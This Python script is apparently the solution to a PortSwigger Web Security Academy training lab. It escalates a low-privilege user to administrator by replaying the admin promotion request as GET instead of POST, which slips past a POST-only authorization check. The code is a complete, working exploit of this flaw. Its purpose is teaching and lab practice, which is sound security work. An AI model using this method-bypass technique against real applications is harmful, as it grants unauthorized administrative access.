#!/usr/bin/env python3
"""
Method-based access control can be circumvented
PortSwigger Web Security Academy -- Access Control

Companion script for the writeup: 11-method-based-access-control-circumvented.md

What this does:
    Logs in as administrator to observe the real promotion endpoint and
    parameter names from the admin panel's own form (/admin-roles,
    username/action), rather than guessing them. Then logs in as wiener and
    replays the same promotion action over GET instead of POST -- the
    authorization check is tied to the literal string "POST", and the router
    maps GET to the same handler without it.

Usage:
    python 11-method-based-access-control-circumvented.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def get_csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def login(client: httpx.Client, base: str, username: str, password: str) -> httpx.Response:
    login_page = client.get(f"{base}/login")
    csrf = get_csrf(login_page.text)
    return client.post(f"{base}/login", data={"csrf": csrf, "username": username, "password": password})


def solve(lab_url: str) -> None:
    # Log in as administrator first to discover the real endpoint from the
    # promotion form itself.
    admin_client = httpx.Client(follow_redirects=True, timeout=15)
    login(admin_client, lab_url, "administrator", "admin")
    resp = admin_client.get(f"{lab_url}/admin")
    print(f"[*] Admin panel (as admin): {resp.status_code}")

    action_match = re.search(r'action="([^"]*)"', resp.text)
    upgrade_path = action_match.group(1) if action_match else "/admin-roles"
    print(f"[+] Promotion endpoint: {upgrade_path}")

    # Now log in as wiener and bypass the POST-only check with GET.
    client = httpx.Client(follow_redirects=True, timeout=15)
    login(client, lab_url, "wiener", "peter")

    resp = client.get(f"{lab_url}{upgrade_path}", params={"username": "wiener", "action": "upgrade"})
    print(f"[*] GET {upgrade_path}?username=wiener&action=upgrade: {resp.status_code}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- wiener promoted to administrator via GET method bypass.")
    else:
        print("[-] Not solved yet -- confirm the endpoint accepts GET for this action.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
